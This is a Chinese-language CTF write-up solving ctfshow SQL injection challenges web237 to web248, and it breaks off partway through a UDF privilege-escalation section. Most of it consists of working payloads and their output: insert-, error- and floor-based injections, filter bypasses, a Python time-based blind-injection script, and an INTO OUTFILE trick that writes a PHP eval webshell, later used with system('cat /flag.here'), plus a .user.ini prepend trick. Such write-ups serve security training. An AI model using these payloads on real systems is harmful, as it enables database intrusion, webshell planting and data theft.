<h1 id="web237"><a href="#web237" class="headerlink" title="web237"></a>web237</h1><h3 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h3><p>记得抓包，不是原来的那个api接口了，而是：<code>/api/insert.php</code><br>其余的都相同。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">7</span><span class="string">&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()));--+&amp;password=2</span></span><br><span class="line"><span class="string">banlist,ctfshow_user,flag</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">7</span><span class="string">&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27;));--+&amp;password=2	</span></span><br><span class="line"><span class="string">id,flagass23s3,info</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">6</span><span class="string">&#x27;,(select flagass23s3 from flag));--+&amp;password=2</span></span><br><span class="line"><span class="string">ctfshow&#123;5efc59c3-4a93-4d07-a546-5a702b6c57c1&#125;</span></span><br></pre></td></tr></table></figure>
<h1 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h1><h3 id="insert-过滤空格"><a href="#insert-过滤空格" class="headerlink" title="insert 过滤空格"></a>insert 过滤空格</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">3</span><span class="string">&#x27;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())));#&amp;password=1</span></span><br><span class="line"><span class="string">banlist,ctfshow_user,flagb</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">3</span><span class="string">&#x27;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;</span>flagb<span class="string">&#x27;)));#&amp;password=1</span></span><br><span class="line"><span class="string">id,flag,info</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">3</span><span class="string">&#x27;,(select(flag)from(flagb)));#&amp;password=1</span></span><br><span class="line"><span class="string">ctfshow&#123;be8f3e4a-b6a0-4747-80d3-91979ef33988&#125;</span></span><br></pre></td></tr></table></figure>
<h1 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h1><h3 id="过滤空格-or"><a href="#过滤空格-or" class="headerlink" title="过滤空格 or"></a>过滤空格 or</h3><p>相同操作，只不过更换查询的表：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">3</span><span class="string">&#x27;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())));#&amp;password=1</span></span><br><span class="line"><span class="string">banlist,ctfshow_user,flagbb</span></span><br></pre></td></tr></table></figure>
<p>这玩应把*过滤了，只能猜flag名，看了一下网上的做法基本如此。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;,(select`flag`from`flagbb`));#&amp;password=1</span></span><br><span class="line"><span class="string">ctfshow&#123;0e1b5153-fff7-48be-aca1-cef950d964a0&#125;</span></span><br></pre></td></tr></table></figure>
<h1 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h1><p>Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写<br>意思就是让我们爆破呗。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url <span class="operator">=</span> &quot;http://a2483863-8c01-4755-a5b3-decf561e6728.challenge.ctf.show/api/insert.php&quot;</span><br><span class="line">name <span class="operator">=</span> &quot;flag&quot;</span><br><span class="line">res <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="string">&#x27;ab&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">&#x27;ab&#x27;</span>:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;ab&#x27;</span>:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> <span class="string">&#x27;ab&#x27;</span>:</span><br><span class="line">                <span class="keyword">for</span> e <span class="keyword">in</span> <span class="string">&#x27;ab&#x27;</span>:</span><br><span class="line">                    res <span class="operator">=</span> name <span class="operator">+</span> a <span class="operator">+</span> b <span class="operator">+</span> c <span class="operator">+</span> d <span class="operator">+</span> e</span><br><span class="line">                    data <span class="operator">=</span> &#123;</span><br><span class="line">                        <span class="string">&#x27;username&#x27;</span>: f&quot;&#123;res&#125;&#x27;,(select(flag)from(&#123;res&#125;)))#&quot;,</span><br><span class="line">                        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;a&#x27;</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    print(data)</span><br><span class="line">                    r <span class="operator">=</span> requests.post(url, data<span class="operator">=</span>data)</span><br></pre></td></tr></table></figure>
<p>跑完一遍之后刷新一下：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690546632830-eb02d773-ff79-495a-9e30-5aa8c826e14b.png" alt="image.png"></p>
<h1 id="web241"><a href="#web241" class="headerlink" title="web241"></a>web241</h1><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><p>遇事不决直接上盲注：<br>目标位置<code>api/delete.php</code><br>先决定一下测试payload，直接在id中传入：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(substr((database())),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;c&#x27;</span>,sleep(<span class="number">0.05</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>这时间盲注不同设备的时间不同，根据自己调整</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"># <span class="operator">-</span><span class="operator">*</span><span class="operator">-</span> encoding: utf<span class="number">-8</span> <span class="operator">-</span><span class="operator">*</span><span class="operator">-</span></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">@File    :   SQL时间盲注1.py   </span><br><span class="line">@Contact :   2997453446@qq.com</span><br><span class="line">@Blog    :   natro92.github.io</span><br><span class="line"> </span><br><span class="line">@Modify Time      @Author    @Version    @Desciption</span><br><span class="line">------------      -------    --------    -----------</span><br><span class="line">2023/7/28 20:21   natro92      1.0        web241</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import <span class="type">time</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"><span class="keyword">from</span> tqdm import trange</span><br><span class="line"></span><br><span class="line">url <span class="operator">=</span> r<span class="string">&#x27;http://b2100936-f04f-42cf-a179-f6bb35e08972.challenge.ctf.show/api/delete.php&#x27;</span></span><br><span class="line">flag_pre <span class="operator">=</span> <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">str <span class="operator">=</span> &quot;_abcdefghijklmnopqrstuvwxyz0123456789&#123;-,&#125; &quot;</span><br><span class="line"># inside <span class="operator">=</span> <span class="string">&#x27;database()&#x27;</span></span><br><span class="line"># inside <span class="operator">=</span> <span class="string">&#x27;select group_concat(table_name) from information_schema.tables where table_schema = database()&#x27;</span></span><br><span class="line"># inside <span class="operator">=</span> <span class="string">&#x27;select group_concat(column_name) from information_schema.columns where table_name = &quot;flag&quot;&#x27;</span></span><br><span class="line">inside <span class="operator">=</span> <span class="string">&#x27;substr((select group_concat(flag) from flag),9,36)&#x27;</span></span><br><span class="line"></span><br><span class="line">payload <span class="operator">=</span> &quot;if(substr((&#123;&#125;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,sleep(0.05),0)&quot;</span><br><span class="line">res <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">last</span> <span class="operator">=</span> <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">1</span>, <span class="number">37</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        data <span class="operator">=</span> &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: payload.format(inside, i, j),</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            # print(data)</span><br><span class="line">            r <span class="operator">=</span> requests.post(url, data<span class="operator">=</span>data, timeout<span class="operator">=</span><span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">last</span> <span class="operator">=</span> res</span><br><span class="line">            res <span class="operator">+</span><span class="operator">=</span> j</span><br><span class="line">            # print(res)</span><br><span class="line">            break</span><br><span class="line">        if <span class="keyword">last</span> <span class="operator">=</span><span class="operator">=</span> res.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            exit()</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(res)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>网络的好坏决定着你在这个途中是否会出现错误。尽量减少位数的盲注，知道的前缀就别注了。</p>
<h1 id="web242"><a href="#web242" class="headerlink" title="web242"></a>web242</h1><h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ctfshow_user <span class="keyword">into</span> outfile <span class="string">&#x27;/var/www/html/dump/&#123;$filename&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h2 id="字段分隔符"><a href="#字段分隔符" class="headerlink" title="字段分隔符"></a>字段分隔符</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FIELDS TERMINATED <span class="keyword">BY</span>‘,‘字段间分割符</span><br><span class="line">OPTIONALLY ENCLOSED <span class="keyword">BY</span>‘&quot;‘将字段包围 对数值型无效</span><br></pre></td></tr></table></figure>
<p>相关参考：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> ... <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;file_name&#x27;</span></span><br><span class="line">        [<span class="type">CHARACTER</span> <span class="keyword">SET</span> charset_name]</span><br><span class="line">        [export_options]</span><br><span class="line"> </span><br><span class="line">export_options:</span><br><span class="line">    [&#123;FIELDS <span class="operator">|</span> COLUMNS&#125;</span><br><span class="line">        [TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;string&#x27;</span>]<span class="operator">/</span><span class="operator">/</span>分隔符</span><br><span class="line">        [[OPTIONALLY] ENCLOSED <span class="keyword">BY</span> <span class="string">&#x27;char&#x27;</span>]</span><br><span class="line">        [ESCAPED <span class="keyword">BY</span> <span class="string">&#x27;char&#x27;</span>]</span><br><span class="line">    ]</span><br><span class="line">    [LINES</span><br><span class="line">        [STARTING <span class="keyword">BY</span> <span class="string">&#x27;string&#x27;</span>]</span><br><span class="line">        [TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;string&#x27;</span>]</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"><span class="comment">/***********************************************************/</span></span><br><span class="line"></span><br><span class="line">“OPTION”参数为可选参数选项，其可能的取值有：</span><br><span class="line"> </span><br><span class="line">`FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;字符串&#x27;</span>`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。</span><br><span class="line"> </span><br><span class="line">`FIELDS ENCLOSED <span class="keyword">BY</span> <span class="string">&#x27;字符&#x27;</span>`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。</span><br><span class="line"> </span><br><span class="line">`FIELDS OPTIONALLY ENCLOSED <span class="keyword">BY</span> <span class="string">&#x27;字符&#x27;</span>`：设置字符来括住<span class="type">CHAR</span>、<span class="type">VARCHAR</span>和TEXT等字符型字段。默认情况下不使用任何符号。</span><br><span class="line"> </span><br><span class="line">`FIELDS ESCAPED <span class="keyword">BY</span> <span class="string">&#x27;字符&#x27;</span>`：设置转义字符，只能为单个字符。默认值为“\”。</span><br><span class="line"> </span><br><span class="line">`LINES STARTING <span class="keyword">BY</span> <span class="string">&#x27;字符串&#x27;</span>`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。</span><br><span class="line"> </span><br><span class="line">`LINES TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;字符串&#x27;</span>`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>比如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">into</span> outfile &quot;位置&quot; fileds terminated <span class="keyword">by</span> <span class="string">&#x27;写入内容&#x27;</span></span><br></pre></td></tr></table></figure>
<p>当然换行符也可以使用。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>备份表</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select * from ctfshow_user into outfile &#x27;/var/www/html/dump/&#123;$filename&#125;&#x27;;&quot;;</span><br></pre></td></tr></table></figure>
<p>我们直接使用测试木马接口位置<code>/api/dump.php</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename<span class="operator">=</span><span class="number">1.</span>php<span class="string">&#x27; fields terminated by &#x27;</span><span class="operator">&lt;</span>?php eval($_REQUEST[<span class="number">1</span>]);?<span class="operator">&gt;</span><span class="string">&#x27;#</span></span><br></pre></td></tr></table></figure>
<p>然后访问<code>/dump/1.php</code><br>get或post传参：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">=</span><span class="keyword">system</span>(<span class="string">&#x27;cat /flag.here&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h1 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h1><h3 id="sql加文件上传图片马"><a href="#sql加文件上传图片马" class="headerlink" title="sql加文件上传图片马"></a>sql加文件上传图片马</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xa6175746f5f70726570656e645f66696c653d312e6a7067</span></span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> </span><br><span class="line">\nauto_prepend_file<span class="operator">=</span><span class="number">1.</span>jpg</span><br></pre></td></tr></table></figure>
<p>首先先传入：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename<span class="operator">=</span><span class="number">1.</span>jpg<span class="string">&#x27; LINES TERMINATED BY 0xa6175746f5f70726570656e645f66696c653d312e6a7067</span></span><br></pre></td></tr></table></figure>
<p>再传入<code>.user.ini</code>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename<span class="operator">=</span>.user.ini<span class="string">&#x27; LINES TERMINATED BY 0x0A6175746F5F70726570656E645F66696C653D67796C712E6A70670A#</span></span><br><span class="line"><span class="string">其中0x0A6175746F5F70726570656E645F66696C653D67796C712E6A70670A是&lt;?php eval($_REQUEST[1]);?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后访问：<code>dump/index.php</code><br>传入命令即可。<code>1=system(&#39;cat /flag.here&#39;);</code></p>
<h1 id="web244"><a href="#web244" class="headerlink" title="web244"></a>web244</h1><h3 id="报错注入-updatexml"><a href="#报错注入-updatexml" class="headerlink" title="报错注入 updatexml"></a>报错注入 updatexml</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>备份表</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;.$id.&quot;&#x27; limit 1;&quot;;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>无过滤</span><br></pre></td></tr></table></figure>
<p>用updatexml报错注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>api<span class="operator">/</span>?id<span class="operator">=</span><span class="string">&#x27; or updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) --+</span></span><br><span class="line"><span class="string">banlist,ctfshow_flag,ctfshow_use</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="string">&#x27; or updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>ctfshow_flag<span class="string">&#x27;)),1) -- A</span></span><br><span class="line"><span class="string">id,flag,info</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag太长需要查两遍：</span><br><span class="line">api<span class="operator">/</span>?id<span class="operator">=</span><span class="string">&#x27; or updatexml(1,concat(1,(select mid(flag,1,30) from ctfshow_flag)),1) --+</span></span><br><span class="line"><span class="string">api/?id=&#x27;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">1</span>,(<span class="keyword">select</span> mid(flag,<span class="number">20</span>,<span class="number">30</span>) <span class="keyword">from</span> ctfshow_flag)),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>然后拼起来：<br>ctfshow{99150aa0-0cf6-4537-ad52-3043e2647334}</p>
<h1 id="web245"><a href="#web245" class="headerlink" title="web245"></a>web245</h1><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>用法类似，这里不多赘述了</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">api<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e)); --+</span></span><br><span class="line"><span class="string">banlist,ctfshow_flagsa,ctfshow_</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">api<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>ctfshow_flagsa<span class="string">&#x27;),0x7e)); --+</span></span><br><span class="line"><span class="string">id,flag1,info</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">api<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or extractvalue(1,concat(0x7e,(select right(flag1,45) from ctfshow_flagsa),0x7e)); --+</span></span><br><span class="line"><span class="string">ctfshow&#123;1eaee386-fce7-49d8-86fd</span></span><br><span class="line"><span class="string">api/?id=1&#x27;</span> <span class="keyword">or</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">right</span>(flag1,<span class="number">30</span>) <span class="keyword">from</span> ctfshow_flagsa),<span class="number">0x7e</span>)); <span class="comment">--+</span></span><br><span class="line"><span class="number">6</span><span class="operator">-</span>fce7<span class="number">-49</span>d8<span class="number">-86</span>fd<span class="number">-15</span>c29674ed78&#125;</span><br></pre></td></tr></table></figure>
<p>ctfshow{1eaee386-fce7-49d8-86fd-15c29674ed78}</p>
<h1 id="web246"><a href="#web246" class="headerlink" title="web246"></a>web246</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://www.cnblogs.com/wzy-ustc/p/14217750.html">https://www.cnblogs.com/wzy-ustc/p/14217750.html</a><br><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html">https://www.cnblogs.com/laoxiajiadeyun/p/10283251.html</a></p>
</blockquote>
<h3 id="floor双查询"><a href="#floor双查询" class="headerlink" title="floor双查询"></a>floor双查询</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>查表名</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand()*2))a from information_schema.tables group by a-- A</span></span><br><span class="line"><span class="string">//查列名</span></span><br><span class="line"><span class="string">/?id=1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;ctfshow_flags&#x27;</span> limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">0x7e</span>,<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a<span class="comment">-- A</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>查数据</span><br><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,count(*),concat((select flag2 from ctfshow_flags),0x7e,floor(rand()*2))a from information_schema.tables group by a-- A</span></span><br></pre></td></tr></table></figure>
<p>需要二次上传才会出现结果</p>
<h1 id="web247"><a href="#web247" class="headerlink" title="web247"></a>web247</h1><h3 id="ceil代替floor"><a href="#ceil代替floor" class="headerlink" title="ceil代替floor"></a>ceil代替floor</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;.$id.&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure>
<p>使用ceil()(向上取整)代替floor()。当然也可以使用round()：<br>ROUND(X) – 表示将值 X 四舍五入为整数，无小数位<br>ROUND(X,D) – 表示将值 X 四舍五入为小数点后 D 位的数值，D为小数点后小数位数。若要保留 X 值小数点左边的 D 位，可将 D 设为负值。<br>最后的payload是：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,count(*),concat((select `flag?` from ctfshow_flagsa),0x7e,ceil(rand()*2))a from information_schema.tables group by a-- A</span></span><br></pre></td></tr></table></figure>
<p>可以看到这个字段名flag?加了反引号，原因是：<br>表名和字段名都可以用反引号引起来，这是用来区分MYSQL的保留字与普通字符。 表名、字段名、数据库名等可用反引号 ( ` )，也可以不使用反引号 ，但如果它包含特殊字符或保留字，则必须使用，如果不使用就会报错。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1690557907870-84c2d526-6b51-41e6-9887-7731d9ddac80.png" alt="image.png"></p>
<h1 id="web248"><a href="#web248" class="headerlink" title="web248"></a>web248</h1><h3 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://lazzzaro.github.io/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/">https://lazzzaro.github.io/2020/05/16/web-SQL%E6%B3%A8%E5%85%A5/</a><br><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/#%E4%B8%89%E3%80%81MYSQL-UDF-%E6%8F%90%E6%9D%83">https://www.k0rz3n.com/2018/10/21/Mysql%20%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8/#%E4%B8%89%E3%80%81MYSQL-UDF-%E6%8F%90%E6%9D%83</a><br><a target="_blank" rel="noopener" href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35938621/article/details/119846053">https://blog.csdn.net/qq_35938621/article/details/119846053</a> 这里讲了详细步骤 建议看看</p>
</blockquote>
<p>UDF是mysql的一个拓展接口，UDF（Userdefined function）可翻译为用户自定义函数，这个是用来拓展Mysql的技术手段。当我们有读取和写入权限以后，我们就可以尝试使用UDF提权的方法，从数据库的root权限提升到系统的管理员权限。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 